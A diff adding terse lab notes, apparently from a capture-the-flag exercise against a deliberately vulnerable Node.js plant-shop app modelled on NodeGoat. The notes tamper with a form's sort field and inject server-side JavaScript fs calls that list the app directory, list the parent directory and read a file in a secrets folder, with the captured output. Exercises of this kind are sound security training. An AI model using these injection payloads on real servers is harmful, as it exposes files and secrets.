@@ -1,0 +1,28 @@
+Open dev tool, find HTML form of the filter
+                            <select name="sortField">
+                            &nbsp;   <option value="name">Name</option>
+                            &nbsp;   <option value="color">Color</option>
+                            &nbsp;   <option value="planttype">Plant type</option>
+                            &nbsp;   <option value="potsize">Pot size</option>
+                            </select>
+
+change value of one of option with the below code like, then submit to see result: 
+<option value="<option value="name">Name</option>">Name</option>
+
+list the contents of the current directory
+res.end(require('fs').readdirSync('.').toString())
+.gitignore,__init__.py,config,models,node_modules,package-
+lock.json,package.json,potplant.db,public,routes,secrets,seedstring,server.js,views
+
+list the contents of the parent directory
+res.end(require('fs').readdirSync('..').toString()) 
+.dockerenv,app,bin,boot,dev,etc,home,lib,lib64,media,mnt,opt,proc,root,run,sbin,srv,sys,tmp,usr,var
+
+res.end(require('fs').readdirSync('secrets').toString())
+secretmessage_9a19.txt
+res.end(require('fs').readFileSync('secrets/secretmessage_9a19.txt'))
+
+Secret:
+Instructions from boss: code 184d56315f3daa34 for agent 135355.
+
+https://nodegoat.herokuapp.com/tutorial
